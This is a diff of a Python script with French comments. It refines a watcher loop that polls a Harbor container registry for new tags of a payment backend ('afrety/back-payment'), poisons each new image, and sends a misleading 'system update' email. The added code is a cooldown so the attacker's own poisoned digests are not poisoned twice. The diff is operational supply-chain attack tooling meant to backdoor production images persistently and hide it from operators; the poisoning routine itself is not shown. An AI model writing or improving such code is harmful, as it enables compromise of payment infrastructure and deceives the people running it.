@@ -205,6 +205,10 @@ def watcher_loop():
             time.sleep(30)
             seen = known_tags()
     log(f"watcher: {len(seen)} artifacts connus")
+    # tag déjà empoisonné par nous -> re-poison seulement après 2h (évite la boucle:
+    # notre poison crée un nouveau digest que le watcher verrait comme "nouveau")
+    poisoned_at = {}  # tag -> epoch de notre dernier poison
+    POISON_COOLDOWN = 7200
     while True:
         time.sleep(POLL)
         try:
@@ -212,25 +216,28 @@ def watcher_loop():
             if tags is None:
                 continue
             new = tags - seen
-            for digest in new:
-                try:
-                    arts = json.loads(harbor("/api/v2.0/projects/afrety/repositories/back-payment/artifacts").read())
-                    for a in arts:
-                        if a["digest"] == digest:
-                            for t in (a.get("tags") or []):
-                                tag = t["name"]
-                                log(f"NOUVEAU TAG: {tag} — empoisonnement...")
-                                ok, detail = poison_new_image(tag)
-                                entry = {"tag": tag, "ok": ok, "detail": detail, "at": time.strftime("%Y-%m-%d %H:%M:%S")}
-                                with lock:
-                                    state["new_tags"].append(entry)
-                                if ok:
-                                    log(f"[POISON OK] {tag} {detail}")
-                                    send_email("Notification Afrety", f"MAJ systeme: {tag}")
-                                else:
-                                    log(f"[POISON ÉCHEC] {tag}: {detail}")
-                except Exception as e:
-                    log(f"err poison: {e}")
+            if new:
+                arts = json.loads(harbor("/api/v2.0/projects/afrety/repositories/back-payment/artifacts").read())
+                for a in arts:
+                    if a["digest"] not in new:
+                        continue
+                    for t in (a.get("tags") or []):
+                        tag = t["name"]
+                        last = poisoned_at.get(tag, 0)
+                        if last and (time.time() - last) < POISON_COOLDOWN:
+                            log(f"tag {tag} déjà empoisonné il y a {int(time.time()-last)}s — skip")
+                            continue
+                        log(f"NOUVEAU TAG: {tag} — empoisonnement...")
+                        ok, detail = poison_new_image(tag)
+                        entry = {"tag": tag, "ok": ok, "detail": detail, "at": time.strftime("%Y-%m-%d %H:%M:%S")}
+                        with lock:
+                            state["new_tags"].append(entry)
+                        if ok:
+                            poisoned_at[tag] = time.time()
+                            log(f"[POISON OK] {tag} {detail}")
+                            send_email("Notification Afrety", f"MAJ systeme: {tag}")
+                        else:
+                            log(f"[POISON ÉCHEC] {tag}: {detail}")
             seen = tags
         except Exception as e:
             log(f"watcher err: {e}")
